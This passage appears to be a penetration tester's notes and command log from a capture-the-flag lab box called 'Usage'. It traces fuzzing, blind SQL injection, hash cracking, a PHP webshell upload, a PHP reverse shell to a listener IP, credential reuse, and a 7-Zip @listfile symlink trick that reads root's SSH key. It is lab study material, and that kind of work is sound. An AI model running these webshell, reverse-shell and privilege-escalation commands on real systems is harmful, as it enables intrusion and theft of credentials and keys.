| Host | `usage` |
| **Effective user running Monit** | **`dash`** |
| Controlfile | `/home/dash/.monitrc` |
| Pidfile | `/home/dash/.monit.pid` |
| State file | `/home/dash/.monit.state` |
| Debug / Log / syslog | False / False / False |
| Send/Expect buffer | 256 B |
| File content buffer | 512 B |

Notes:
- **monit runs as `dash`, not root** — confirmed from its own runtime page, not inferred
  from `ps`. So actions it performs carry `dash` privileges, not elevated ones.
- Logging is **off** across the board (Debug/Log/syslog all False).
- The control file is `~/.monitrc`, which we own and can write (§P6: `-rwx------ dash`).

### `/etc/passwd` — accounts with shells

```
dash    uid 1000  /home/dash    /bin/bash   <- current foothold
xander  uid 1001  /home/xander  /bin/bash   <- SECOND human user, unexplored
```

**`xander` is a real login account** — and `xander` was the *password* on both `raj`
rows in the DB (§4). Same string, now surfacing as a username. Immediate pivot
candidates for `su xander` / SSH as xander:
- `xander` (name-as-password is common; the box already reused it once)
- the SSH key recovered in §5 — **whose key is it?** If it's xander's, this is the pivot.
- `3nc0d3d_pa$$w0rd` (monit cred) — only proven NOT to be dash/root; xander untested.

Other notable service accounts in passwd:
- **`_laurel` (uid 998, /var/log/laurel)** — the **Laurel** auditd transformer. auditd is
  installed and logging. Assume every command run on this box is recorded to
  `/var/log/laurel/`. Operationally relevant; on HTB just be aware it's there.
- **`lxd` (uid 999)** — LXD present. `dash` is NOT in the `lxd` group (§P6 groups=1000
  only), so the classic lxd-group escalation is not directly available, but note it.
- `clamav`, `tcpdump`, `mysql`, `tss` (TPM) — standard daemons.

### ✅ Pivot to `xander` → sudo root path

`3nc0d3d_pa$$w0rd` (the monit `allow` credential) is **`xander`'s login password**.
Confirms the earlier reuse-hunt: the monit cred was validated as NOT dash/root (§P6),
and it turned out to be xander's all along — a *third* identity for the same string
(monit `admin`, and now the system user `xander`).

```
xander@usage:~$ sudo -l
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

- **`/usr/bin/usage_management`** — a **custom binary** (non-package name), runnable as
  **any user incl. root, no password**. This is the P7 root vector.
- `use_pty` and `secure_path` are set — standard hardened sudoers, no PATH-hijack of the
  binary's own name.
- **Do not just run it.** Custom sudo binaries are reverse-engineering targets: find what
  it executes (`strings`, `ltrace`, `file`; copy it to `loot/` and read it) before firing.
  Common patterns: it shells out to another tool (7z/tar/mysqldump) via a relative path or
  with attacker-influenced input → argument injection / PATH abuse / symlink.

### `/usr/bin/usage_management` — behaviour (runtime, no RE needed)

```
1. Project Backup       -> 7-Zip 16.02 (p7zip), archive -> /var/backups/project.zip
                           "Scanning the drive: 2984 folders, 17945 files"
2. Backup MySQL data    -> dumps DB
3. Reset admin password -> "Password has been reset."
```

**Source not required.** The escalation isn't in the binary's logic — it's in the
**external tool option 1 shells out to (`7za`)**, whose behaviour is fully visible at
runtime. It scans a project tree and archives it as root. Two things to pin down (both
observable without RE):

- **Which directory does the backup run over, and can `dash`/`xander` write there?**
  It scanned ~18k files / 109 MiB — that's the web project. `dash` can already write
  into the webroot (we dropped the webshell in `/uploads`, §5).
- **Does it invoke 7z with a wildcard** (`7za a project.zip *`)? 7-Zip has switch-like
  file semantics: a filename beginning with `@` is read as a *listfile*, and `-i`/`-x`
  args are honoured from matched names. A wildcard over an attacker-writable dir is the
  classic p7zip-as-root primitive. (Behaviour, not a CVE — version-independent.)

**CONFIRMED — the exact call (option 1):**

```
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

- `a` add · `-tzip` · `-snl` store symlinks as links · `-mmt` multithread · `--` end of
  switches · **`*` = shell glob over the CWD** (the web project root — `dash`/`xander`
  can write there, §5).
- **⚠️ CORRECTION (proven locally, was wrong before): `--` DOES block the `@` trick.**
  Reproduced with 7za on Kali; results verified against the target run:

  | command form | `@`+symlink read | symlink→content |
  |---|---|---|
  | `-snl` only, NO `--` | ✅ leaks | ✗ (snl stores link) |
  | `--` only, NO `-snl` | ✗ (`--` blocks `@`) | ✅ leaks |
  | **both (target)** | ✗ | ✗ |

  - `--` terminates ALL non-switch special parsing incl. `@` listfiles → `@secret`
    becomes a **literal file that gets archived** (this is the +2 file count and clean
    output we saw on the target: `17945 -> 17947`, both planted files stored).
  - `-snl` = store symlinks as links (verified: extracts as a dangling link, **no
    content**), so archiving a symlink and reading the zip leaks nothing either.
  - With BOTH flags present, both standard p7zip primitives are dead.
- **✅ RESOLVED — the real blocker was DIRECTORY PLACEMENT, not `--`.** Verified locally
  and against the official writeup:

  ```
  @id_rsa in a SUBDIR (project_admin/):  archived as content, NO leak   <- what we did
  @id_rsa at TOP LEVEL of the backup CWD (/var/www/html): LEAKS         <- writeup
  ```

  For `@x` to be a **listfile**, it must be a **top-level argument** the glob `*` emits.
  The glob runs in the backup CWD (`/var/www/html`). Files planted in the `project_admin/`
  **subdirectory** are reached by 7z's *recursion into the matched directory* and archived
  as plain content — `@x` is never seen as a `@`-argument. That is precisely the
  `17945 -> 17947, clean` we observed, and it is independent of `--`.
- The `--`-blocks-`@` behaviour I recorded is real for 7z **26.02** (Kali), but the target
  runs **16.02** where the writeup's top-level `@` trick fires. So `--` was a red herring
  for THIS box; the fix is placement.

**WORKING EXPLOIT (per writeup, top-level placement):**

```
cd /var/www/html
ln -s /root/.ssh/id_rsa id_rsa
touch @id_rsa
sudo /usr/bin/usage_management        # option 1
# key leaks line-by-line in "<line> : No more files" errors (root@usage, ed25519)
# strip the suffix, reassemble, chmod 600, ssh -i key root@usage.htb
```

- **Open question (now moot): is `--` truly in the runtime command?** `strings` shows fragments, not
  the assembled `system()`/`execve` line. Confirm with `ltrace` on a LOCAL copy:
  `cp /usr/bin/usage_management /tmp/um; ltrace -f -s400 /tmp/um` (choose 1) → read the
  exact command. If `--` is absent, the `@` trick works (proven, even with `-snl`); if
  present, a different path is needed.

`strings`/`ltrace` only *confirmed* the wildcard + working dir; the primitive is
already implied by the output. Copy the binary to `loot/` if you want the confirmation.

### Next → P7

### ✅ ROOT

`sudo /usr/bin/usage_management` (NOPASSWD as xander) → option 1 runs, as root:
`/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *` in `/var/www/html`.
p7zip treats a top-level `@file` argument as a **listfile**; pointed at a symlink to
`/root/.ssh/id_rsa`, 7z (as root) reads the key and echoes each line in
`<line> : No more files` errors.

```
cd /var/www/html
ln -s /root/.ssh/id_rsa id_rsa
touch @id_rsa
sudo /usr/bin/usage_management        # 1
# -> root's ed25519 key (root@usage) leaks line-by-line
# reassemble -> chmod 600 -> ssh -i key root@usage.htb  => ROOT + root.txt
```

Full exploit + the failure analysis in `exploits/7z_root_read.md`. Key subtlety: the
`@` file must be **top level** in the backup CWD (a subdir plant is recursed as content,
never seen as a listfile argument — cost us a detour, §7 lesson 7).

### (superseded) generic P6 next-steps
- [ ] `sudo -l`
- [ ] SUID/SGID sweep, `getcap -r /`
- [ ] cron / timers / root processes (`pspy`) — **known target: the ~2min upload cleanup**
- [ ] configs & creds: `.env` (the real one), DB creds, history files
- [ ] spray `xander` / `whatever1` at `su`, SSH, DB (§4 — reuse already proven once)
- [ ] `ss -tulpn` for internal-only listeners — **known: `127.0.0.1:2812` (monit)**
- [ ] user.txt

---

## 6. Dead ends

### `uri` field on `/admin/auth/menu/{id}` — traversal never reached the server

Set `uri = ../../../../../etc/passwd` on menu id 8. The rendered link resolved to
`http://admin.usage.htb/etc/passwd`.

**Not a negative result — the payload was rewritten client-side.** `uri` is rendered
into an `<a href>`; the browser applied RFC 3986 `remove_dot_segments` to the relative
reference before sending anything, collapsing the `../` chain against the base path.
The server never saw the traversal string.

- Tells us `uri` is a **link target resolved client-side**, not a path passed to a
  server-side file function.
- To actually test what the app does with the stored value, the request has to bypass
  browser normalization — `curl` with literal bytes, or `%2e%2e%2f` encoding.
- **Status: untested, not negative.**

### Request-path traversal — closed (`exploits/traversal_test.sh`)

Retested properly with `curl --path-as-is` + a live admin session, 7 encodings:

```
raw ../                  400  166     nginx error page
url-encoded %2e%2e%2f    400  166     nginx error page
double-encoded           404  6603    <- Laravel 404
backslash variant        403  162     nginx forbidden
semicolon prefix         400  166     nginx
under /admin             400  166     nginx
under /admin/auth        400  166     nginx
baseline /admin          200  21322   dashboard
```

- **166 bytes = nginx's own error page.** Those never reached php-fpm.
- **6603 bytes = Laravel's 404** — the exact size measured in §7/ffuf debugging when
  `nope12345` 404'd on this vhost. So **double-encoding is the only variant that got
  past nginx to the app**: nginx normalizes the path *before* percent-decoding, so
  `%252e%252e%252f` reads as ordinary path chars. Laravel then routed it, found
  nothing, and 404'd. It reached the **router**, not the filesystem.
- Conclusion: **no traversal via the request path.** nginx blocks the direct forms;
  the surviving form hits routing only.
- **Still untested:** what the app does with a traversal value *stored* in `uri`
  (or `http_path`) — a different code path from the request URL.

Third distinct flavour of ambiguous negative on this box:
1. wordlist could not contain the answer (`forget-password`, §7 lesson 4)
2. answers dropped in transit under fuzzing load (§7 lessons 1-2)
3. payload rewritten by our own client before transmission (this one)

---

## 7. Lessons

1. **This box drops requests under ffuf load — results are non-deterministic.**
   Same command, same wordlist, back-to-back runs on `admin.usage.htb` returned
   **0, then 1, then 2** results. Confirmed by direct `curl` that `/admin` is a
   real 302 the "0-result" run silently missed. At `-t 10` it was *still* flaky
   (one pass found `admin`, the next found nothing; `usage.htb` lost `login`
   between passes). **Never trust a single ffuf negative on this target** —
   run every wordlist at least twice and union the results.
   (Same family as the GoodGames vhost false negative, different cause: there the
   wordlist couldn't contain the answer; here the answer was there and the *transport*
   dropped it.)

2. **Calibrate the fuzz rate with known-good canaries before trusting any wordlist run.**
   Lesson 1's flakiness is *rate-dependent*, and it's severe. Method: build a ~3k wordlist,
   inject 3 paths already confirmed 200 by curl (`login`, `dashboard`, `registration`), and
   count how many come back at each rate.

   | `-rate` | canaries found |
   |---|---|
   | 200 | 1/3 |
   | 60  | **0/3** |
   | 40  | 3/3 |
   | 30  | 3/3 |
   | 20  | 3/3 (×2 runs) |

   Threshold sits between 40 and 60 req/s. Default ffuf (`-t 40`, unthrottled, ~1100 req/s)
   loses roughly **two thirds of true positives** and reports them as nothing. The full 30k
   authed run at `-t 10` unthrottled found only `login` — it silently dropped `dashboard`
   and `registration`, both confirmed 200 and both verified present in the wordlist.

   Note `-t` (threads) is *not* the knob — `-t 10` still failed. **`-rate` is.**
   Settled on `-rate 30` for this box.

   The canary trick generalizes: **never run a big wordlist against a new target without
   seeding it with paths you already know exist.** A fuzz result is only as trustworthy as
   its ability to re-find the things you can already see.

3. **Strip `logout` from the wordlist before an authenticated fuzz.** `raft-medium-directories`
   contains `logout`, `logoff`, `signout` (+ capitalized variants) — any one of them destroys
   the session server-side partway through, and every result after that point is a silent
   false negative *for a different reason than the rate problem*. Two failure modes stacking
   would have been near-impossible to untangle after the fact.

4. **The rate-calibrated recursive fuzz came back clean — and still found nothing new.**
   `-rate 30`, depth 2, authenticated, 30k words: exactly 3 results (`/login`,
   `/dashboard`, `/registration`) — i.e. only the three canaries. That is a *correct*
   run, not a broken one; lessons 1–3 are fixed. It found nothing because the answers
   are not in the wordlist:

   | real route | in `raft-medium-directories`? |
   |---|---|
   | `/forget-password` | **no** |
   | `/post-login` | **no** |
   | `/post-registration` | **no** |

   The list carries **nine** near-misses — `forgot-password`, `forgot_password`,
   `forgotpassword`, `forgotPassword`, `reset-password`, `reset_password`,
   `resetpassword`, `password-reset`, `password_reset` — but not the app's actual,
   grammatically-odd `forget-password`. Three of the app's five real routes are
   structurally unreachable by fuzzing.

   **Every single interesting route on this box came from reading page source
   (the Burp export), not from a wordlist.** And `/forget-password` is where the
   SQLi is. Fuzzing found the boring half of the app; the crawl found the vuln.

   Reinforces METHODOLOGY P3 ordering: *crawl for real* (links, JS, forms) is not a
   supplement to the content brute, it outranks it. Fuzz for what you can't see linked;
   never let a clean fuzz convince you the surface is mapped.
   (GoodGames taught the same thing via a vhost that was in no wordlist. Second box
   running. The failure is not the wordlist's size — Jhaddix 2.1M wouldn't have had
   `forget-password` either — it's that custom route names are *unguessable by
   construction*.)

5. **The answer was in the response the whole time — the GUI just didn't render it.**
   Spent a stretch concluding "the LFI isn't working" because the browser showed nothing,
   while Burp had the output sitting there. Rendered page ≠ response body: output can land
   in a PJAX fragment the page discards, in a container that's replaced, inside a comment,
   or in a response the browser never paints.

   **This is the 4th distinct ambiguous negative on this box**, and the set now covers
   every stage of the request lifecycle:

   | # | where the truth was lost | §  |
   |---|---|---|
   | 1 | wordlist could not contain the answer | §7.4 |
   | 2 | responses dropped in transit under load | §7.1-2 |
   | 3 | payload rewritten by our own client before sending | §6 |
   | 4 | **response received correctly, but not rendered** | here |

   Rule: **read the response, not the page.** When a technique "doesn't work", confirm
   where in the chain the evidence disappeared before believing it.

6. **Two different clocks were biting, and I conflated them.** Both cost time; they are
   unrelated and have different fixes.

   - **CSRF / session — 2 HOURS.** sqlmap replaying a 15h-old `.req` gave **419 Page
     Expired x6**, which reads exactly like "not injectable" (§3). Laravel's
     `laravel_session` is `Max-Age=7200` and `_token` is bound to it. Fix:
     `--csrf-token=_token --csrf-url=<form URL> --csrf-retries=3`, or script the
     GET-form → scrape-token → POST loop. Never debug a payload against a stale token —
     the two failures are indistinguishable.
   - **Upload cleanup — ~2 MINUTES.** Uploaded files were wiped and the *original avatar
     restored*. That is not session expiry (wrong timescale, and expiry 419s rather than
     deleting files). It is a **scheduled task on the host** — see §5.

   Laravel's `laravel_session` is `Max-Age=7200` (2h) and `_token` is bound to it. Any
   workflow that captures a request and replays it repeatedly **has a 2-hour fuse**, and
   it burns silently — you get a plausible-looking failure, not an auth error you'd notice.

   Practical: for sqlmap use `--csrf-token=_token --csrf-url=<form URL> --csrf-retries=3`;
   for hand-driven work, script the "GET the form, scrape `_token` + cookie, POST" loop
   rather than copy-pasting a token per attempt. Never debug a payload against a stale
   token — you cannot tell the two failures apart.

7. **A `@` listfile only triggers as a top-level command-line argument.** The 7z root
   leak failed on the first try not because of the `7za ... --` flag (the rabbit hole I
   chased and had to walk back) but because the `@id_rsa` file was planted in a
   **subdirectory** of the backup CWD. The glob `*` runs in `/var/www/html`; a file in
   `project_admin/` is reached by 7z *recursing into the matched directory* and archived
   as plain content — it is never passed as a `@` argument, so the listfile behaviour
   never fires. Verified locally: subdir → no leak; top-level → leak. Generalizes to any
   wildcard/argument-injection: **your payload has to become an argument, not recursed
   content.** Placement is part of the exploit.

8. **Validate a tool's behaviour on the version you'll face, and don't let a matching
   symptom end the investigation.** `--` blocking `@` is real on 7z 26.02 (my Kali) and
   false on 16.02 (the target). I reproduced the 26.02 behaviour, saw it matched the
   "clean output" symptom, and stopped — when the true cause (directory) produced the
   identical symptom. Two different mechanisms, one appearance. The official writeup, not
   my local repro, broke the tie. When a hypothesis "matches," check whether a *second*
   cause produces the same evidence before closing.

9. **The whole box was a study in ambiguous negatives — five distinct kinds.** Every one
   looked like "nothing there" and none was:
   | # | negative that lied | real cause |
   |---|---|---|
   | 1 | ffuf 0 results | wordlist couldn't contain the answer (`forget-password`) |
   | 2 | ffuf 0 results | responses dropped in transit under load (rate) |
   | 3 | LFI "goes to /etc/passwd" | browser normalized the path before sending |
   | 4 | "LFI isn't working" | response was correct, GUI didn't render it (read Burp) |
   | 5 | 7z "@ trick" clean output | payload in a subdir, never became an argument |
   Plus the inverse win: the monit-cred `su` negative became **trustworthy** only after
   validating the cred against monit's own UI (known-good channel). **A negative is only
   evidence of absence once you've confirmed the test could have produced a positive.**

---

## 8. Command log

```
# 1. scaffold
mkdir -p Labs/Usage/{scans,loot,exploits}

# 2. full TCP sweep (first attempt failed - VPN was down, all 65535 "filtered")
nmap -p- --min-rate 5000 -T4 -oA scans/allports 10.129.55.135
#    -> 22, 80

# 3. service/version
nmap -sCV -p22,80 -oA scans/services 10.129.55.135
#    -> OpenSSH 8.9p1 Ubuntu, nginx 1.18.0, redirect to usage.htb

# 4. fingerprint + vhost baseline
curl -s -D- -o /dev/null --resolve usage.htb:80:10.129.55.135 http://usage.htb/
curl -s -o /dev/null -w '%{http_code} %{size_download}' -H 'Host: zzz.usage.htb' http://10.129.55.135/
#    -> Laravel cookies; baseline 301/178

# 5. vhost fuzz
ffuf -u http://10.129.55.135/ -H 'Host: FUZZ.usage.htb' \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 178 -o scans/vhost.ffuf -of json
#    -> admin

# 6. content brute, both vhosts (raft-medium-directories) - SEE LESSON 1, flaky
ffuf -u http://10.129.55.135/FUZZ -H 'Host: usage.htb'       -w .../raft-medium-directories.txt
ffuf -u http://10.129.55.135/FUZZ -H 'Host: admin.usage.htb' -w .../raft-medium-directories.txt
#    -> union across runs: usage.htb {login, logout}, admin.usage.htb {admin, vendor}

# 7. parse the Burp export (reused GoodGames parser - handles base64="true" bodies)
cp ../GoodGames/exploits/burp_parse.py exploits/
python3 exploits/burp_parse.py loot/Site_Requests --inventory
python3 exploits/burp_parse.py loot/Site_Requests --dump /tmp/burp
grep -hoE '(src|href)="[^"]*vendor[^"]*"' /tmp/burp/*.txt | sort -u
#    -> encore/laravel-admin confirmed; /forget-password found (ffuf missed it)

# 8. authenticated fuzz - session lifted from the Burp capture (still valid, 2h Max-Age)
#    verify before use: 200 with cookie, 302 -> /login without
curl -s -o /dev/null -w '%{http_code}' -H 'Host: usage.htb' -H "Cookie: $AUTH" \
     http://10.129.55.135/dashboard

# 9. strip logout from the wordlist (see lesson 3)
grep -vixE 'logout|log-out|log_out|signout|sign-out|logoff' raft-medium-directories.txt > wl_nologout.txt

# 10. rate calibration with canaries (see lesson 2)
{ head -3000 wl_nologout.txt; printf 'login\ndashboard\nregistration\n'; } | awk '!seen[$0]++' > canary.txt
for R in 200 60 40 30 20; do ffuf ... -w canary.txt -rate $R ...; done
#    -> 1/3, 0/3, 3/3, 3/3, 3/3   => use -rate 30

# 11. the real run: authenticated, recursive, rate-limited
ffuf -u http://10.129.55.135/FUZZ -H 'Host: usage.htb' -H "Cookie: $AUTH" \
     -w wl_nologout.txt -recursion -recursion-depth 2 -rate 30 -t 10 -timeout 15 \
     -o scans/dirs_auth_recursive.json -of json

# 12. recursive authed scan result: 3 hits, all of them the canaries. correct run,
#     empty outcome - the app's real routes simply aren't in the wordlist (lesson 4)
grep -cxF 'forget-password' wl_nologout.txt   # -> 0
grep -cxF 'post-login'      wl_nologout.txt   # -> 0

# 13. FIRST sqlmap detection run - worked, but ~19 min and still grinding at 33
sqlmap -r exploits/forget_password.req -p email \
       --second-url='http://usage.htb/forget-password' \
       --csrf-token=_token --csrf-url='http://usage.htb/forget-password' \
       --delay=0.3 --threads=1 --dbms=mysql --level=5 --risk=3 --batch
#    -> OR boolean-based blind injectable; UNION injectable with 2 columns
#    -> NOTE --second-order is the OLD flag name; 1.10.8 wants --second-url

# 14. attempted "faster" phase-2 with level/risk at DEFAULTS -> BROKE IT
#    -> "POST parameter 'email' does not seem to be injectable"  (500 x20)

# 15. why: read the payload definitions. level/risk gate WHICH TECHNIQUES EXIST
grep -l . /usr/share/sqlmap/data/xml/payloads/*.xml
#    risk=1 level=1  AND boolean-based blind - WHERE or HAVING clause
#    risk=3 level=1  OR  boolean-based blind - WHERE or HAVING clause   <- ours
#    risk=1 level=3  Generic UNION query ([RANDNUM]) - custom columns   <- ours
#    => never lower level/risk below where a technique was confirmed

# 16. read official writeup pp.1-8 -> plain `--level 3` works, no --second-url,
#     no --csrf. Their default-level run failed identically to ours (500 x22,
#     503 x8). The discriminator is --level>=2, NOT second-order handling.
#     (corrected §3; sqlmap already follows the 302 itself under --batch)

# 17. session expiry trap: replayed a 15h-old capture -> 419 Page Expired x6.
#     Laravel cookies are Max-Age=7200 (2h). Recaptured in Burp, rebuilt the
#     .req (strip leftover '' from the email value, fix Content-Length).

# 18-21. enumeration, via exploits/sqlmap_fp_exploit.sh
#     (--level=3 --technique=B --delay=0.1 --csrf-token/--csrf-url/--csrf-retries=3)
./exploits/sqlmap_fp_exploit.sh --dbs
#    -> information_schema, performance_schema, usage_blog
./exploits/sqlmap_fp_exploit.sh -D usage_blog --tables
#    -> 15 tables (9x admin_* = laravel-admin schema, + blog, users)
./exploits/sqlmap_fp_exploit.sh -D usage_blog -T users --dump
#    -> 2 rows, raj@raj.com / raj@usage.htb, bcrypt
./exploits/sqlmap_fp_exploit.sh -D usage_blog -T admin_users --dump
#    -> 1 row, admin / "Administrator", bcrypt, non-null remember_token
#    -> 500 x852 during the dump = the boolean oracle firing, expected

# 22. crack on the Windows host (RTX 5060 Ti) - NOT in the VM
#     transfer the file VM->host directly; pasting via an editor corrupts it
D:\hashcat-7.1.2\hashcat.exe -m 3200 -a 0 hash.hash D:\hashcat-7.1.2\rockyou.txt
#    -> all 3 in ~7s. whatever1 = rockyou line 1586, xander = line 2163
#    -> frequency-sorted wordlist: a hit comes fast or not at all

# 23. logins verified by hand
#     usage.htb        raj@usage.htb:xander  and  raj@raj.com:xander   OK
#     admin.usage.htb  admin:whatever1                                  OK

# 24. authed recon on the admin panel - the dashboard leaks the whole stack
curl -s -D- -H 'Host: admin.usage.htb' -H "Cookie: $ADMIN_SESSION" \
     http://10.129.55.135/admin
#    -> Environment widget : PHP 8.1.2, Laravel 10.18.0, Env=local,
#                            session/cache driver=file, uname "usage" (not a container)
#    -> Dependencies widget: encore/laravel-admin 1.8.18  <- version question CLOSED
#                            laravel/framework ^10.10, sanctum ^3.2, tinker ^2.8,
#                            symfony/filesystem ^6.3

# 25. parse the authed admin-panel capture (41 items)
python3 exploits/burp_parse.py loot/admin_recon --inventory
python3 exploits/burp_parse.py loot/admin_recon --dump /tmp/adm
grep -oE 'name="[^"]*"(; filename="[^"]*")?' /tmp/adm/*POST*   # field map per endpoint
#    -> 9 admin endpoints; ALL forms multipart + _token + _method(PUT)
#    -> TWO file inputs, both `avatar`: /admin/auth/users/1 and /admin/auth/setting
#    -> path-like text fields: http_path (permissions), uri (menu)

# 26. LFI attempt via menu `uri` field -> INCONCLUSIVE (see §6)
#     set uri = ../../../../../etc/passwd on menu id 8, clicked the rendered link
#     -> browser resolved it to http://admin.usage.htb/etc/passwd
#     -> RFC 3986 remove_dot_segments collapsed the ../ chain CLIENT-SIDE.
#        the server never received the traversal. retest with literal bytes:
#          curl -H 'Host: admin.usage.htb' --path-as-is ".../%2e%2e%2f..."

# 27. proper traversal retest - exploits/traversal_test.sh (curl --path-as-is)
SID='XSRF-TOKEN=...; laravel_session=...' ./exploits/traversal_test.sh
#    -> raw/encoded/semicolon/prefixed : 400 @166B = nginx error page, never hit PHP
#    -> backslash                      : 403 @162B = nginx forbidden
#    -> DOUBLE-encoded                 : 404 @6603B = LARAVEL's 404 -> reached the app
#       (nginx normalizes before percent-decoding, so %252e%252e%252f survives it)
#    -> request-path traversal CLOSED. reached the router, not the filesystem.

# 28. FOOTHOLD - unrestricted file upload on the admin `avatar` field
#     .php extension, Content-Type spoofed to image/jpeg, payload:
#       <?php system($_GET["cmd"]); ?>
#     stored inside the webroot at a path where php-fpm executes it:
curl "http://admin.usage.htb//uploads/images/shell.php?cmd=id"
#    -> uid=1000(dash) gid=1000(dash) groups=1000(dash)

# 29. reverse shell to 10.10.15.212:9001 (listener convention, Labs/CLAUDE.md)
#     via ?cmd= (URL-encoded):
php -r '$sock=fsockopen("10.10.15.212",9001);system("bash <&3 >&3 2>&3");'
#    -> shell as dash. private SSH key found post-shell.
#    NOTE: fd-3 style, not /dev/tcp - works where bash lacks net redirection.

# 30. P6 local recon as dash
ps aux
#    -> nginx workers run as dash; /usr/bin/monit running as dash (pid 22594)
ls -la ~
#    -> .monitrc (0700 dash) .monit.{id,pid,state}
#    -> .bash_history -> /dev/null (root-owned symlink, deliberately nulled)
#    -> .ssh/ 0700 ; user.txt root:dash 0640

# 31. monit runtime artifacts
cat .monit.state   # binary; strings -> apache, usage, rootfs
cat .monit.id      # 3a9b9027aa4aa1e4abd7bd41850c738c
cat .monit.pid     # No such file - monit EXITED since the 14:37 ps snapshot

# 32. read the monit config (NB: it is 0700 = executable; ./.monitrc runs it as
#     shell and errors. cat it.)
cat ~/.monitrc
#    -> allow admin:3nc0d3d_pa$$w0rd    <- CREDENTIAL
#    -> set httpd port 2812 / use address 127.0.0.1   <- internal-only listener
#    -> set daemon 60 ; every rule "then alert", NO exec -> monit is NOT the cleanup
#    -> check process apache (pidfile /var/run/apache2/...) but host runs nginx = stale

# 33. validate the monit credential against its OWN service (known-good channel)
curl -s -u 'admin:3nc0d3d_pa$$w0rd' http://127.0.0.1:2812/ | head
#    -> monit status page. cred + quoting confirmed correct.
#    => the earlier su negative for dash/root is now TRUSTWORTHY, not ambiguous.
#    -> Monit 5.31.0 ; apache check = "Does not exist" (stale, host runs nginx)
#    NB single-quote it: $$ is the shell PID variable and would mangle the password.

# 34. tunnel monit's loopback UI out and map it
ssh -i <key> -L 2812:127.0.0.1:2812 dash@usage.htb -N
#    NB Firefox bypasses the proxy for loopback -> Burp sees nothing.
#       about:config network.proxy.allow_hijacking_localhost = true
python3 exploits/burp_parse.py loot/monit_recon --inventory
#    -> / _about _runtime usage apache rootfs ; POST forms on _runtime/usage/apache/rootfs
#    -> HTTP Basic + rotating `securitytoken` CSRF (6 values / 12 reqs)
#    -> /_runtime: monit runs as dash, controlfile /home/dash/.monitrc, logging all off

# 35. pspy ran, no useful tick caught yet. checked /etc/passwd for other users:
cat /etc/passwd | grep -E 'sh$'
#    -> xander:x:1001:1001::/home/xander:/bin/bash   <- 2nd human user
#    -> "xander" was ALSO the DB password on both raj rows (§4). pivot target.
#    -> also present: _laurel (auditd logging), lxd (dash not in group)

# 36. pivot: 3nc0d3d_pa$$w0rd is xander's password (monit cred reused)
su xander           # or ssh xander@usage.htb
sudo -l
#    -> (ALL : ALL) NOPASSWD: /usr/bin/usage_management   <- custom binary, root, P7

# 37. run usage_management to observe behaviour (don't RE what runtime already shows)
sudo /usr/bin/usage_management
#    1 Project Backup    -> 7za 16.02 -> /var/backups/project.zip (scans ~18k files = webroot)
#    2 Backup MySQL data
#    3 Reset admin password
#    => vuln is in the 7z call (option 1), not the binary logic. p7zip wildcard/@listfile.

# 38. confirmed the 7z invocation behind option 1 (strings/ltrace):
#     /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
#     -> `*` glob over a writable CWD; `--` does NOT block @listfile semantics
#     -> plant `@symlink` -> 7z reads root-only file as a listfile -> leaks it via errors
#     -> arbitrary file read AS ROOT. (p7zip behaviour, not a CVE.)

# 39. @-trick attempt FAILED (clean output, +2 files archived). reproduced locally:
cd /tmp && mkdir t && cd t; printf 'A\nB\n' > /tmp/fake; ln -s /tmp/fake secret; touch @secret
7za a /tmp/o.zip -tzip -snl -mmt -- *     # WITH -- : no leak, @secret archived literally
7za a /tmp/o2.zip -tzip -snl -mmt *       # WITHOUT --: LEAKS via "No such file" warnings
#    => `--` blocks @listfile; `-snl` blocks symlink-content. target has BOTH.
#    NEXT: ltrace a local copy to confirm the EXACT command (strings != execve args)
ltrace -f -s400 /tmp/um   # choose 1, read the real system()/execve string

# 40. ROOT via 7z @-listfile - the real fix was DIRECTORY, not `--` (verified locally)
#     subdir plant -> @id_rsa recursed as content, no leak (our earlier failure)
#     TOP-LEVEL plant in the backup CWD -> @id_rsa is a glob argument -> listfile -> leak
cd /var/www/html
ln -s /root/.ssh/id_rsa id_rsa
touch @id_rsa
sudo /usr/bin/usage_management        # 1
#    -> root's ed25519 key leaks in "<line> : No more files" errors
#    -> reassemble, chmod 600, ssh -i key root@usage.htb  => ROOT
```

---

## 8b. Full kill chain

```
nmap                     22 (OpenSSH 8.9p1) + 80 (nginx 1.18) -> redirect usage.htb
vhost fuzz               admin.usage.htb (Laravel admin panel)
Burp crawl               real routes NOT in wordlists: /forget-password, /post-login, ...
SQLi                     POST /forget-password `email`, boolean-blind + UNION, MySQL
  (2nd-order flash msg is the oracle; sqlmap needs --level>=2, not --second-url)
DB dump                  usage_blog.users + admin_users -> 3 bcrypt hashes
crack (RTX 5060 Ti)      -m 3200 rockyou: admin:whatever1, raj:xander x2  (~7s, top-2200)
admin login              encore/laravel-admin 1.8.18 (dashboard leaks full stack)
file upload              avatar field, Content-Type spoof image/jpeg on shell.php
  -> /uploads/images/shell.php?cmd=  -> RCE as dash (uid 1000, nginx runs as dash)
reverse shell            php fsockopen fd-3 -> 9001
local recon              monit(as dash) UI cred admin:3nc0d3d_pa$$w0rd @127.0.0.1:2812
  -> that password is xander's (validated against monit UI first)
pivot                    su xander ; sudo -l = NOPASSWD /usr/bin/usage_management
privesc                  option 1 = 7za a ...zip -snl -mmt -- *  (as root, in /var/www/html)
  -> plant TOP-LEVEL @id_rsa + symlink id_rsa->/root/.ssh/id_rsa
  -> 7z reads key as a listfile, leaks it via "No more files" errors
  -> ssh -i key root@usage.htb  => ROOT
```

## 8c. CWES relevance

Both queued classes hit, plus bonus reps:
- **Blind SQLi** (queued) — time/boolean/UNION, second-order oracle, CSRF-token handling,
  the `--level`-gates-techniques lesson, rate-limited target.
- **File upload** (queued) — Content-Type-only validation bypass → webshell in an
  executable webroot path.
- Bonus: stored-input reflection (operation log), path-traversal analysis (client vs
  nginx vs app normalization), sudo-binary / LOLBin abuse (7z listfile file-read-as-root),
  credential reuse across identity systems, internal-service pivot via SSH `-L` tunnel.

